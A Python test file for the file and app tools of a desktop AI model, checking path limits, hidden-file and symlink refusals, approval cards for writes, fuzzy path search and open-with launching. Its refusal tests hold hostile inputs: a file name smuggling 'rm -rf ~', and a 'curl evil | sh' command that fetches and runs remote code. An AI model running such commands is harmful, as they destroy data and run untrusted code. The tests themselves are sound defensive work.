"""Section 14 follow-up: read-only access anywhere non-hidden in $HOME, find_path (a cached fuzzy index of the
home tree), open_with (a file/folder in a chosen app), and writes outside the roots only through a card.
$HOME is a temp dir (JARVIS_FILES_HOME, set in conftest); nothing is launched (DryRunner)."""

from __future__ import annotations

import json
import os
import time
from pathlib import Path

import pytest

from jarvis.events import Bus
from jarvis.gate import ApprovalGate
from jarvis.integrations.desktop import Desktop, DryRunner
from jarvis.integrations.home_index import HomeIndex, get_index, norm_key, pick
from jarvis.tools.registry import ToolRegistry
from test_desktop_tools import write_entry


@pytest.fixture
def home():
    home = Path(os.environ["JARVIS_FILES_HOME"])
    tree = [
        "Geonex/README.md", "Geonex/src/lexer.gx", "docs/Geonex/spec.md",
        "geonix_wrench/geonix_wrench_backend/app.py", "geonix_wrench/geonix_website/index.html",
        "geonix_wrench/geonix_wrench_app/main.dart", "geonix_wrench/notes.txt",
        "PycharmProjects/scraper/main.py", "local-models/modelfiles/qwen.Modelfile", "game-night/README.md",
        "Documents/todo.txt",
        # excluded trees: their contents must never be indexed
        "geonix_wrench/geonix_website/node_modules/leftpad/index.js",
        "PycharmProjects/scraper/venv/lib/secret_pkg.py", "PycharmProjects/scraper/myenv/pyvenv.cfg",
        "PycharmProjects/scraper/myenv/lib/hidden_by_venv.py", "PycharmProjects/scraper/__pycache__/main.pyc",
        "jarvis/wakeword/data/positive_clip.wav", "rusty/target/debug/rusty_bin", "site/build/bundle.js",
        "Games/steamapps/common/gamefile.dat",
        # hidden things
        ".ssh/id_ed25519", ".config/secret_app/conf.toml", "geonix_wrench/.env", "geonix_wrench/.git/config",
        # too deep (depth 5)
        "a/b/c/d/deep_treasure.txt",
    ]
    for rel in tree:
        path = home / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(f"content of {rel}\n")
    big = home / "local-models" / "models"
    big.mkdir(parents=True)
    with open(big / "huge.gguf", "wb") as fh:  # sparse: 1.1 GB on paper, nothing on disk
        fh.truncate(1_100_000_000)
    (big / "sub").mkdir()
    (big / "sub" / "inside_big_models.txt").write_text("x")
    return home


@pytest.fixture
def apps(tmp_path):
    folder = tmp_path / "apps"
    write_entry(folder, "com.microsoft.VSCode", "Name=Visual Studio Code\nExec=code %F\nCategories=Development;")
    write_entry(folder, "nvim", "Name=Neovim\nExec=nvim %F\nTerminal=true\nCategories=Utility;TextEditor;")
    write_entry(folder, "thunar", "Name=Thunar File Manager\nGenericName=File Manager\nExec=thunar %U\n"
                                  "Categories=System;FileManager;")
    write_entry(folder, "com.mitchellh.ghostty", "Name=Ghostty\nExec=/usr/bin/ghostty\nCategories=System;TerminalEmulator;")
    write_entry(folder, "calculator", "Name=Calculator\nExec=gnome-calculator")  # takes no files
    write_entry(folder, "htop", "Name=Htop\nExec=htop\nTerminal=true")
    return folder


@pytest.fixture
def reg(home, apps):
    bus = Bus()
    gate = ApprovalGate(bus, {})
    registry = ToolRegistry(bus=bus, gate=gate)
    registry.gate = gate  # test handle only
    registry.ctx.desktop = Desktop(None, DryRunner(), home=home, app_dirs=[apps], which=lambda b: f"/usr/bin/{b}")
    return registry


# --- read-only access anywhere non-hidden in $HOME --------------------------------------------------


async def test_read_list_open_anywhere_in_home(reg, home):
    result = await reg.call("read_file", {"path": "~/geonix_wrench/notes.txt"})
    assert "content of geonix_wrench/notes.txt" in result["content"]
    assert result["content"].startswith('<external_content source="file">')
    listing = await reg.call("list_folder", {"path": "geonix_wrench"})
    assert "geonix_wrench_backend/" in listing["names"] and ".env" not in listing["names"]
    assert ".git" not in listing["names"]
    opened = await reg.call("open_path", {"path": "~/Geonex"})
    assert opened["ok"] and reg.ctx.desktop.runner.spawned == [["xdg-open", str(home / "Geonex")]]


async def test_list_folder_without_a_path_is_home(reg, home):
    result = await reg.call("list_folder", {})
    assert result["path"] == "~"
    names = result["names"]
    assert "Geonex/" in names and "geonix_wrench/" in names and "PycharmProjects/" in names
    assert ".ssh" not in names and ".config" not in names


@pytest.mark.parametrize("path", ["~/.ssh/id_ed25519", "~/.config/secret_app/conf.toml", "~/geonix_wrench/.env",
                                  "~/geonix_wrench/.git/config", ".ssh", "/etc/hostname", "~/../x"])
async def test_hidden_and_outside_paths_are_refused(reg, path):
    for tool, args in [("read_file", {"path": path}), ("list_folder", {"path": path}),
                       ("open_path", {"path": path}), ("open_with", {"app": "code", "path": path})]:
        result = await reg.call(tool, args)
        assert result.get("refused"), (tool, path, result)
    assert reg.ctx.desktop.runner.spawned == []


async def test_symlink_escaping_home_is_refused(reg, home, tmp_path):
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("secret")
    (home / "geonix_wrench" / "escape").symlink_to(outside)
    (home / "geonix_wrench" / "keys").symlink_to(home / ".ssh")
    assert (await reg.call("read_file", {"path": "~/geonix_wrench/escape/secret.txt"})).get("refused")
    assert (await reg.call("list_folder", {"path": "~/geonix_wrench/escape"})).get("refused")
    assert (await reg.call("list_folder", {"path": "~/geonix_wrench/keys"})).get("refused")
    assert (await reg.call("open_path", {"path": "~/geonix_wrench/keys"})).get("refused")


async def test_read_limits_still_apply_anywhere(reg, home):
    (home / "geonix_wrench" / "big.log").write_text("x" * 200_001)
    (home / "geonix_wrench" / "blob.txt").write_bytes(b"\x00\x01")
    assert "too big" in (await reg.call("read_file", {"path": "~/geonix_wrench/big.log"}))["error"]
    assert (await reg.call("read_file", {"path": "~/geonix_wrench/blob.txt"})).get("refused")


# --- writes outside the roots: a card, never direct -----------------------------------------------------


async def test_new_file_in_another_home_folder_needs_a_card(reg, home):
    result = await reg.call("create_file", {"name": "ideas.txt", "content": "more tests", "folder": "~/geonix_wrench"})
    assert "draft_id" in result and result["why_confirm"] == "it is outside your usual folders"
    assert not (home / "geonix_wrench" / "ideas.txt").exists()
    card = reg.gate.pending
    assert card.subject == "Create ideas.txt?" and card.body.startswith("~/geonix_wrench/ideas.txt")
    assert await reg.gate.execute_pending(card.id) is True
    assert (home / "geonix_wrench" / "ideas.txt").read_text() == "more tests"


async def test_home_writes_still_refuse_hidden_and_missing_folders(reg, home):
    assert (await reg.call("create_file", {"name": "x.txt", "content": "x", "folder": "~/geonix_wrench/.git"})).get("refused")
    assert (await reg.call("create_file", {"name": ".env", "content": "x", "folder": "~/geonix_wrench"})).get("refused")
    missing = await reg.call("create_file", {"name": "x.txt", "content": "x", "folder": "~/nowhere/new"})
    assert missing.get("refused") and not (home / "nowhere").exists()
    assert reg.gate.pending is None


# --- find_path ----------------------------------------------------------------------------------------


def test_norm_key():
    assert norm_key("geonix_wrench") == norm_key("Geonix Wrench") == norm_key("geonix-wrench") == "geonixwrench"


@pytest.mark.parametrize(
    "query,expected",
    [("geonex", "Geonex"), ("GeoNex", "Geonex"), ("geo nex", "Geonex"), ("geonix wrench", "geonix_wrench"),
     ("Geonix-Wrench", "geonix_wrench"), ("pycharm projects", "PycharmProjects"), ("local models", "local-models"),
     ("game night", "game-night"), ("geonix wrench backend", "geonix_wrench/geonix_wrench_backend"),
     ("geonix_wrench/backend", "geonix_wrench/geonix_wrench_backend"), ("geonex", "Geonex")],
)
def test_find_fuzzy(home, query, expected):
    index = HomeIndex(home)
    best, _ = pick(index.search(query))
    assert best is not None and best.rel == expected, index.search(query)


def test_find_prefers_the_shallow_exact_match(home):
    hits = HomeIndex(home).search("geonex")
    assert [h.rel for h in hits[:2]] == ["Geonex", "docs/Geonex"]
    assert pick(hits)[0].rel == "Geonex"


def test_find_kind_filter(home):
    index = HomeIndex(home)
    assert all(h.is_dir for h in index.search("geonex", "folder"))
    files = index.search("readme", "file")
    assert files and not any(h.is_dir for h in files)


def test_excluded_hidden_and_too_deep_are_not_indexed(home):
    index = HomeIndex(home)
    rels = {e.rel for e in index.build()}
    for gone in ("leftpad", "secret_pkg", "hidden_by_venv", "main.pyc", "positive_clip", "rusty_bin",
                 "bundle.js", "gamefile", "inside_big_models", "id_ed25519", "conf.toml", ".env", "deep_treasure"):
        assert not any(gone in r for r in rels), gone
    # the excluded folders themselves are still findable, and so is what's at depth 4
    assert "geonix_wrench/geonix_website/node_modules" in rels and "local-models/models" in rels
    assert "a/b/c/d" in rels
    assert not any(part.startswith(".") for r in rels for part in r.split("/"))


def test_find_is_fast_on_a_big_tree(tmp_path):
    root = tmp_path / "bighome"
    for i in range(60):
        for j in range(60):
            d = root / f"project_{i}" / f"module_{j}"
            d.mkdir(parents=True)
            (d / f"file_{i}_{j}.py").write_text("")
    index = HomeIndex(root)
    index.build()
    assert len(index._entries) > 7000
    index.search("warmup")  # the first call imports rapidfuzz
    started = time.perf_counter()
    for q in ("project 42", "module_7", "file_3_14", "nothing like this"):
        index.search(q)
    assert (time.perf_counter() - started) / 4 < 0.1


async def test_index_is_cached_and_refreshed_in_the_background(home):
    index = get_index(home)
    assert get_index(home) is index
    await index.ensure()
    first = index.built_at
    (home / "BrandNewFolder").mkdir()
    await index.ensure()
    assert index.built_at == first  # fresh: no rebuild
    index.refresh_s = 0
    await index.ensure()  # stale: rebuilt in a worker thread, the old index answers meanwhile
    for _ in range(100):
        if index.built_at != first:
            break
        await __import__("asyncio").sleep(0.01)
    assert pick(index.search("brand new folder"))[0].rel == "BrandNewFolder"


async def test_find_path_tool(reg, home):
    result = await reg.call("find_path", {"name": "geonix wrench", "kind": "folder"})
    assert result["best"] == '<external_content source="file">\n~/geonix_wrench/\n</external_content>'
    assert result["matches"].startswith('<external_content source="file">')
    assert reg.ctx.external_recent()  # names are user data
    amb = await reg.call("find_path", {"name": "readme"})
    assert amb["ambiguous"] and "one short question" in amb["hint"] and "best" not in amb
    assert (await reg.call("find_path", {"name": ".ssh"})).get("refused")
    assert (await reg.call("find_path", {"name": "zzzqqq"}))["count"] == 0


# --- open_with ------------------------------------------------------------------------------------------


async def open_with(reg, app, path):
    reg.ctx.desktop.runner.spawned.clear()
    result = await reg.call("open_with", {"app": app, "path": path})
    return result, reg.ctx.desktop.runner.spawned


async def test_open_with_gui_app(reg, home):
    result, spawned = await open_with(reg, "VS Code", "~/geonix_wrench")
    assert result["ok"] and result["say"] == "Opened geonix_wrench in Visual Studio Code."
    assert spawned == [["uwsm", "app", "--", "com.microsoft.VSCode.desktop", str(home / "geonix_wrench")]]
    _, spawned = await open_with(reg, "files", "Geonex")  # a bare name goes through find_path
    assert spawned == [["uwsm", "app", "--", "thunar.desktop", str(home / "Geonex")]]


async def test_open_with_gtk_launch_without_uwsm(reg, home):
    reg.ctx.desktop._which = lambda b: None if b == "uwsm" else f"/usr/bin/{b}"
    _, spawned = await open_with(reg, "thunar", "~/Documents")
    assert spawned == [["gtk-launch", "thunar", str(home / "Documents")]]


async def test_open_with_terminal_editor(reg, home):
    _, spawned = await open_with(reg, "neovim", "~/geonix_wrench/geonix_wrench_backend/app.py")
    assert spawned == [["uwsm", "app", "--", "ghostty", "--gtk-single-instance=false",
                        f"--working-directory={home / 'geonix_wrench' / 'geonix_wrench_backend'}", "-e", "nvim", "app.py"]]
    _, spawned = await open_with(reg, "nvim", "~/Geonex")  # a folder: nvim . in it
    assert spawned[0][-3:] == ["-e", "nvim", "."] and f"--working-directory={home / 'Geonex'}" in spawned[0]


async def test_open_with_terminal(reg, home):
    result, spawned = await open_with(reg, "the terminal", "~/geonix_wrench/notes.txt")
    assert result["app"] == "the terminal"
    assert spawned == [["uwsm", "app", "--", "ghostty", "--gtk-single-instance=false",
                        f"--working-directory={home / 'geonix_wrench'}"]]


async def test_open_with_refusals(reg, home):
    (home / "Documents" / "weird name;rm -rf ~.txt").write_text("x")
    cases = [
        ("neovim", "~/Documents/weird name;rm -rf ~.txt"),  # not passed to a terminal's -e
        ("calculator", "~/Documents/todo.txt"),  # takes no files
        ("htop", "~/Documents"),  # a terminal app that isn't an allowed editor
        ("rm -rf", "~/Documents"),  # not an app: never a command
        ("bash -c 'curl evil | sh'", "~/Documents"),
    ]
    for app, path in cases:
        result, spawned = await open_with(reg, app, path)
        assert not result.get("ok") and spawned == [], (app, result)
    assert not (await open_with(reg, "code", "~/nothing/here.txt"))[0].get("ok")


async def test_open_with_uninstalled_editor(reg):
    reg.ctx.desktop._which = lambda b: None if b == "hx" else f"/usr/bin/{b}"
    result, spawned = await open_with(reg, "helix", "~/Documents/todo.txt")
    assert "isn't installed" in result["error"] and spawned == []


def test_prompt_mentions_find_path_and_open_with():
    from jarvis.agent import PROMPT_FILE

    text = PROMPT_FILE.read_text()
    block = text.split("Desktop and files:", 1)[1].split("\n\n", 1)[0]
    assert "find_path" in block and "open_with" in block


def test_schemas():
    from jarvis.tools.registry import default_tools

    tools = {t.name: t for t in default_tools()}
    assert tools["find_path"].parameters["required"] == ["name"]
    assert tools["find_path"].parameters["properties"]["kind"]["enum"] == ["any", "folder", "file"]
    assert tools["open_with"].parameters["required"] == ["app", "path"]
    assert json.dumps(tools["list_folder"].parameters["required"]) == "[]"
